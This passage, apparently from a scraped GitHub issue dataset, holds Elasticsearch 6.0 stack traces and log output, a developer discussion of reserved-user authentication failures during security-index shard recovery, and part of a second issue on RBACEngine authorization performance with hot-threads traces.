	at org.elasticsearch.action.support.TransportAction.execute(TransportAction.java:139) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.support.TransportAction.execute(TransportAction.java:81) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.client.node.NodeClient.executeLocally(NodeClient.java:83) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.client.node.NodeClient.doExecute(NodeClient.java:72) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.client.support.AbstractClient.execute(AbstractClient.java:405) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.client.FilterClient.doExecute(FilterClient.java:67) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.InternalClient.doExecute(InternalClient.java:86) ~[?:?]
	at org.elasticsearch.client.support.AbstractClient.execute(AbstractClient.java:405) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.ActionRequestBuilder.execute(ActionRequestBuilder.java:71) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.esnative.NativeUsersStore.getReservedUserInfo(NativeUsersStore.java:553) ~[?:?]
	at org.elasticsearch.xpack.security.authc.esnative.ReservedRealm.getUserInfo(ReservedRealm.java:241) ~[?:?]
	at org.elasticsearch.xpack.security.authc.esnative.ReservedRealm.doAuthenticate(ReservedRealm.java:95) ~[?:?]
	at org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.doAuthenticateAndCache(CachingUsernamePasswordRealm.java:170) ~[?:?]
	at org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.authenticateWithCache(CachingUsernamePasswordRealm.java:109) ~[?:?]
	at org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.authenticate(CachingUsernamePasswordRealm.java:94) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$consumeToken$13(AuthenticationService.java:284) ~[?:?]
	at org.elasticsearch.xpack.common.IteratingActionListener.run(IteratingActionListener.java:93) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.consumeToken(AuthenticationService.java:320) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$extractToken$9(AuthenticationService.java:257) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.extractToken(AuthenticationService.java:266) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$null$0(AuthenticationService.java:201) ~[?:?]
	at org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:60) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.TokenService.getAndValidateToken(TokenService.java:193) ~[x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$2(AuthenticationService.java:197) ~[x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$lookForExistingAuthentication$4(AuthenticationService.java:228) ~[x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lookForExistingAuthentication(AuthenticationService.java:239) [x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.authenticateAsync(AuthenticationService.java:193) [x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.access$000(AuthenticationService.java:147) [x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:99) [x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.rest.SecurityRestFilter.handleRequest(SecurityRestFilter.java:69) [x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.rest.RestController.dispatchRequest(RestController.java:240) [elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.rest.RestController.tryAllHandlers(RestController.java:336) [elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.rest.RestController.dispatchRequest(RestController.java:174) [elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.http.netty4.Netty4HttpServerTransport.dispatchRequest(Netty4HttpServerTransport.java:495) [transport-netty4-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.http.netty4.Netty4HttpRequestHandler.channelRead0(Netty4HttpRequestHandler.java:72) [transport-netty4-6.0.0-beta1.jar:6.0.0-beta1]
	at io.netty.channel.SimpleChannelInboundHandler.channelRead(SimpleChannelInboundHandler.java:105) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:340) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at org.elasticsearch.http.netty4.pipelining.HttpPipeliningHandler.channelRead(HttpPipeliningHandler.java:63) [transport-netty4-6.0.0-beta1.jar:6.0.0-beta1]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:340) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.handler.codec.MessageToMessageDecoder.channelRead(MessageToMessageDecoder.java:102) [netty-codec-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.handler.codec.MessageToMessageCodec.channelRead(MessageToMessageCodec.java:111) [netty-codec-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:340) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.handler.codec.MessageToMessageDecoder.channelRead(MessageToMessageDecoder.java:102) [netty-codec-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:340) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.handler.codec.MessageToMessageDecoder.channelRead(MessageToMessageDecoder.java:102) [netty-codec-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:340) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.handler.codec.ByteToMessageDecoder.fireChannelRead(ByteToMessageDecoder.java:310) [netty-codec-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:284) [netty-codec-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:340) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.ChannelInboundHandlerAdapter.channelRead(ChannelInboundHandlerAdapter.java:86) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:340) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1334) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:926) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:134) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:644) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.nio.NioEventLoop.processSelectedKeysPlain(NioEventLoop.java:544) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:498) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:458) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.util.concurrent.SingleThreadEventExecutor$5.run(SingleThreadEventExecutor.java:858) [netty-common-4.1.13.Final.jar:4.1.13.Final]
	at java.lang.Thread.run(Thread.java:745) [?:1.8.0_111]
[2017-08-01T09:22:22,324][ERROR][o.e.x.s.a.e.ReservedRealm] [d1S5k1-] failed to retrieve password hash for reserved user [kibana]
[2017-08-01T09:22:22,324][INFO ][o.e.x.s.a.AuthenticationService] [d1S5k1-] Authentication of [kibana] was terminated by realm [reserved] - failed to authenticate user [kibana]
[2017-08-01T09:22:22,403][ERROR][o.e.x.s.a.e.NativeUsersStore] [d1S5k1-] failed to retrieve built in user [kibana] info
org.elasticsearch.action.NoShardAvailableActionException: No shard available for [get [.security][doc][reserved-user-kibana]: routing [null]]
	at org.elasticsearch.action.support.single.shard.TransportSingleShardAction$AsyncSingleAction.perform(TransportSingleShardAction.java:209) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.support.single.shard.TransportSingleShardAction$AsyncSingleAction.onFailure(TransportSingleShardAction.java:196) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.support.single.shard.TransportSingleShardAction$AsyncSingleAction.access$1300(TransportSingleShardAction.java:123) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.support.single.shard.TransportSingleShardAction$AsyncSingleAction$2.handleException(TransportSingleShardAction.java:252) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.transport.TransportService$ContextRestoreResponseHandler.handleException(TransportService.java:1060) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.transport.TransportService$DirectResponseChannel.processException(TransportService.java:1164) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.transport.TransportService$DirectResponseChannel.sendResponse(TransportService.java:1142) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.transport.DelegatingTransportChannel.sendResponse(DelegatingTransportChannel.java:70) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.transport.RequestHandlerRegistry$TransportChannelWrapper.sendResponse(RequestHandlerRegistry.java:120) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.transport.SecurityServerTransportInterceptor$ProfileSecuredRequestHandler$1.onFailure(SecurityServerTransportInterceptor.java:244) ~[?:?]
	at org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:39) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.common.util.concurrent.EsExecutors$1.execute(EsExecutors.java:139) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.transport.SecurityServerTransportInterceptor$ProfileSecuredRequestHandler.lambda$messageReceived$0(SecurityServerTransportInterceptor.java:302) ~[?:?]
	at org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:60) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.transport.ServerTransportFilter$NodeProfile.lambda$null$2(ServerTransportFilter.java:158) ~[?:?]
	at org.elasticsearch.xpack.security.authz.AuthorizationUtils$AsyncAuthorizer.maybeRun(AuthorizationUtils.java:124) ~[?:?]
	at org.elasticsearch.xpack.security.authz.AuthorizationUtils$AsyncAuthorizer.setRunAsRoles(AuthorizationUtils.java:118) ~[?:?]
	at org.elasticsearch.xpack.security.authz.AuthorizationUtils$AsyncAuthorizer.authorize(AuthorizationUtils.java:106) ~[?:?]
	at org.elasticsearch.xpack.security.transport.ServerTransportFilter$NodeProfile.lambda$inbound$3(ServerTransportFilter.java:160) ~[?:?]
	at org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:60) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$2(AuthenticationService.java:195) ~[x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$lookForExistingAuthentication$4(AuthenticationService.java:228) ~[x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lookForExistingAuthentication(AuthenticationService.java:239) [x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.authenticateAsync(AuthenticationService.java:193) [x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.access$000(AuthenticationService.java:147) [x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:116) [x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.transport.ServerTransportFilter$NodeProfile.inbound(ServerTransportFilter.java:139) [x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.transport.SecurityServerTransportInterceptor$ProfileSecuredRequestHandler.messageReceived(SecurityServerTransportInterceptor.java:309) [x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.transport.RequestHandlerRegistry.processMessageReceived(RequestHandlerRegistry.java:66) [elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.transport.TransportService$7.doRun(TransportService.java:650) [elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.common.util.concurrent.ThreadContext$ContextPreservingAbstractRunnable.doRun(ThreadContext.java:638) [elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37) [elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) [?:1.8.0_111]
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) [?:1.8.0_111]
	at java.lang.Thread.run(Thread.java:745) [?:1.8.0_111]
Caused by: org.elasticsearch.transport.RemoteTransportException: [d1S5k1-][127.0.0.1:9300][indices:data/read/get[s]]
Caused by: org.elasticsearch.index.shard.IllegalIndexShardStateException: CurrentState[RECOVERING] operations only allowed when shard state is one of [POST_RECOVERY, STARTED, RELOCATED]
	at org.elasticsearch.index.shard.IndexShard.readAllowed(IndexShard.java:1370) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.index.shard.IndexShard.get(IndexShard.java:809) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.index.get.ShardGetService.innerGet(ShardGetService.java:153) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.index.get.ShardGetService.get(ShardGetService.java:81) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.get.TransportGetAction.shardOperation(TransportGetAction.java:88) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.get.TransportGetAction.shardOperation(TransportGetAction.java:44) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.support.single.shard.TransportSingleShardAction$ShardTransportHandler.messageReceived(TransportSingleShardAction.java:294) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.support.single.shard.TransportSingleShardAction$ShardTransportHandler.messageReceived(TransportSingleShardAction.java:287) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.transport.TransportRequestHandler.messageReceived(TransportRequestHandler.java:30) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.transport.SecurityServerTransportInterceptor$ProfileSecuredRequestHandler$1.doRun(SecurityServerTransportInterceptor.java:253) ~[?:?]
	at org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	... 24 more
[2017-08-01T09:22:22,409][ERROR][o.e.x.s.a.e.ReservedRealm] [d1S5k1-] failed to retrieve password hash for reserved user [kibana]
[2017-08-01T09:22:22,409][INFO ][o.e.x.s.a.AuthenticationService] [d1S5k1-] Authentication of [kibana] was terminated by realm [reserved] - failed to authenticate user [kibana]
[2017-08-01T09:22:22,626][WARN ][o.e.x.s.b.BootstrapElasticPassword] [d1S5k1-] elastic password was not bootstrapped because its password was already set
[2017-08-01T09:22:22,991][INFO ][o.e.c.r.a.AllocationService] [d1S5k1-] Cluster health status changed from [RED] to [YELLOW] (reason: [shards started [[.watcher-history-6-2017.07.31][0], [.monitoring-alerts-6][0], [.monitoring-es-6-2017.07.31][0]] ...]).
^C[2017-08-01T10:30:13,178][INFO ][o.e.n.Node               ] [d1S5k1-] stopping ...
[2017-08-01T10:30:13,178][INFO ][o.e.x.m.j.p.NativeController] Native controller process has stopped - no new native processes can be started
[2017-08-01T10:30:13,351][INFO ][o.e.n.Node               ] [d1S5k1-] stopped
[2017-08-01T10:30:13,351][INFO ][o.e.n.Node               ] [d1S5k1-] closing ...
[2017-08-01T10:30:13,364][INFO ][o.e.n.Node               ] [d1S5k1-] closed
```




*Original comment by @pickypg:*

@skearns64 

> do we expect the Kibana monitoring plugin to stop trying when it receives an auth failure?

No, we don't. The client auth code was cloned from the core Kibana code. But looking at the last line from the Kibana log that you referenced:

> log   [14:31:13.949] EMAIL REDACTED Status changed from red to green - Ready

The monitoring plugin is going green, not red.*Original comment by @jaymode:*

> do we expect requests to be allowed before the native realm is available?

@skearns64 Yes. The native realm could never be available if there is an issue with the security index and we cannot block requests otherwise you may not be able to perform the operations necessary to recover your cluster. Additionally a request could be using a non native user, such as LDAP/AD/PKI and file based users.*Original comment by @tsullivan:*

> Issue 2: When the Kibana Monitoring Plugin sees a failed login, it stops trying, and the Kibana monitoring plugin stays in the red state forever, which (somewhat strangely) results in the Kibana error message about licensing shown above.

There is an open issue related to restarting ES for the monitoring cluster will cause Monitoring's license checker to fail: LINK REDACTED In my tests, the Monitoring plugin doesn't stay in the red state forever, and it has not caused any impact to the user session.

I wonder if the test case for this issue also reproduces LINK REDACTED as a side-effect.*Original comment by @skearns64:*

> @skearns64 Yes. The native realm could never be available if there is an issue with the security index and we cannot block requests otherwise you may not be able to perform the operations necessary to recover your cluster.

@jaymode - I see, and that makes sense, but it results in a confusing getting started experience - I was concerned to see a bunch of auth errors during startup, despite the fact that the correct username/password was provided. If I looked closely at the exceptions, I sort of guessed at what had happened, but I was still worried that something had gone wrong with the bootstrapping process. Are there other options here?

@pickypg - oy, right you are, I read too fast! 
@tsullivan - it sounds like that Could be the Kibana issue.. in this case, it's the default x-pack install, so the monitoring cluster is the same as the production cluster. Would the monitoring license check block access to the cluster, or does the production cluster license check behave in the same way?*Original comment by @tsullivan:*

> Would the monitoring license check block access to the cluster, or does the production cluster license check behave in the same way?

There is only one thing that the monitoring license check is used to guard, which is the Cluster Alerts feature and that is why LINK REDACTED is scoped to a Cluster Alerts concern. Everything else license-wise in Monitoring is for guarding multi-cluster monitoring, and that looks at the license data in the indexed cluster data in the monitoring indices.

I suggest that we try to run this test case with Monitoring UI disabled. I think Monitoring is a red herring here.*Original comment by @bohyun-e:*

I tested a few times using **BC5**. TLDR is that I'm not running into the error that Bhavya and Steve ran into after following the repro steps. 

But along the way, I did run into a number of different issues while I had the correct username/password and I could log into localhost:9200 using the user/pass combination but Kibana kept redirecting me back to the login page. I tried using different browsers. After series of tries, I finally was able to log into Kibana. I'm still not sure what the issue was as all of the error messages I got was 
`[2017-08-01T10:33:40,354][INFO ][o.e.x.s.a.AuthenticationService] [Pi2-SWi] Authentication of [elastic] was terminated by realm [reserved] - failed to authenticate user [elastic]`*Original comment by @jaymode:*

> I'm still not sure what the issue was as all of the error messages I got was
[2017-08-01T10:33:40,354][INFO ][o.e.x.s.a.AuthenticationService] [Pi2-SWi] Authentication of [elastic] was terminated by realm [reserved] - failed to authenticate user [elastic]

Sounds like the wrong password was being used somewhere. Maybe a Kibana cookie or something?*Original comment by @bohyun-e:*

@jaymode I saw the following logs while I was using Kibana through Chrome in incognito mode. It stopped logging though after a while. Will report back if it continues.

![image](https://user-images.githubusercontent.com/18126877/28840317-79920430-76ab-11e7-9847-dabb4378c7f3.png)

*Original comment by @pickypg:*

@bohyun-e 

You're running out of disk space and ES just entered into the ""save the data from corruption"" mode by making all of your indices read-only. I wonder how this plays with `.security`, but most importantly means that you need to clear out a lot of your disk space to allow ES to run normally. Once you've cleared out at least 10% of your disk (high watermark) or 20% (low watermark), then you can mark your indices as writeable again by fixing the setting.",no,">bug,:Security/Authentication,Team:Security,"
elastic/elasticsearch,794257386,"Improve Authorization performance in clusters with a large number of indices","The `RBACEngine#resolveAuthorizedIndicesForRole` computes a list of all the indices that a role grants access to, given the request action. This list is subsequently used during the evaluation of the request's index name expression.

The issue is that [the list](https://github.com/elastic/elasticsearch/blob/126ec9edf6cf725e0f221082a8b5e175056e6380/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authz/AuthorizationService.java#L282) can be large. Worse, the expensive, in both time and memory, list creation (eg the repeated resizings) might take place on `transport_worker` threads that have to multiplex (select) reads between multiple TCP connections (channels, in netty/nio terminology), effectively delaying responses on the other connections (which might lead to cluster instability).

A list is wasteful because the request's wildcard will generally only match a small subset of the full list, which is the only data that needs to be stored in the re-written request. Ideally, the ""authorized indices"" full list should instead be an `Iterable` generator, which doesn't store all the names in memory. The generator refactoring, can also be improved by another refactoring, where we [traverse the authorized indices only once](https://github.com/elastic/elasticsearch/blob/126ec9edf6cf725e0f221082a8b5e175056e6380/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authz/AuthorizationService.java#L490).

<details>
<summary> Here's a very long list of very long stack traces from a hot threads output, that I've based my above analysis on:</summary>

```
   100.5% (502.3ms out of 500ms) cpu usage by thread 'elasticsearch[cf75d9f511c336298a744fdd552abb85cf75d9f][transport_worker][T#1]'
     10/10 snapshots sharing following 330 elements
       org.elasticsearch.xpack.security.authz.RBACEngine.loadAuthorizedIndices(RBACEngine.java:352)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$5(AuthorizationService.java:269)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5139/0x000000080182c428.getAsync(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.getAsync(AuthorizationService.java:676)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$8(AuthorizationService.java:272)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5140/0x000000080182c650.getAsync(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.getAsync(AuthorizationService.java:676)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$authorizeIndexAction$4(RBACEngine.java:313)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$5143/0x000000080182cce8.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.RBACEngine.authorizeIndexActionName(RBACEngine.java:337)
       org.elasticsearch.xpack.security.authz.RBACEngine.authorizeIndexAction(RBACEngine.java:310)
       org.elasticsearch.xpack.security.authz.AuthorizationService.authorizeAction(AuthorizationService.java:283)
       org.elasticsearch.xpack.security.authz.AuthorizationService.maybeAuthorizeRunAs(AuthorizationService.java:248)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorize$1(AuthorizationService.java:212)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$4818/0x0000000801616018.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.action.support.ContextPreservingActionListener.onResponse(ContextPreservingActionListener.java:43)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$resolveAuthorizationInfo$1(RBACEngine.java:123)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$4820/0x0000000801616478.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.store.CompositeRolesStore.getRoles(CompositeRolesStore.java:274)
       org.elasticsearch.xpack.security.authz.RBACEngine.getRoles(RBACEngine.java:129)
       org.elasticsearch.xpack.security.authz.RBACEngine.resolveAuthorizationInfo(RBACEngine.java:117)
       org.elasticsearch.xpack.security.authz.AuthorizationService.authorize(AuthorizationService.java:214)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.authorizeRequest(SecurityActionFilter.java:173)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.lambda$applyInternal$3(SecurityActionFilter.java:159)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter$$Lambda$4921/0x0000000801795be8.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$2(AuthenticationService.java:323)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4778/0x0000000801615bb8.accept(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$lookForExistingAuthentication$6(AuthenticationService.java:384)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4779/0x0000000801615df0.run(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lookForExistingAuthentication(AuthenticationService.java:395)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.authenticateAsync(AuthenticationService.java:320)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.access$000(AuthenticationService.java:261)
       org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:156)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.applyInternal(SecurityActionFilter.java:156)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.apply(SecurityActionFilter.java:108)
       app//org.elasticsearch.action.support.TransportAction$RequestFilterChain.proceed(TransportAction.java:177)
       app//org.elasticsearch.action.support.TransportAction.execute(TransportAction.java:155)
       app//org.elasticsearch.action.support.TransportAction.execute(TransportAction.java:83)
       app//org.elasticsearch.action.support.replication.TransportBroadcastReplicationAction.shardExecute(TransportBroadcastReplicationAction.java:118)
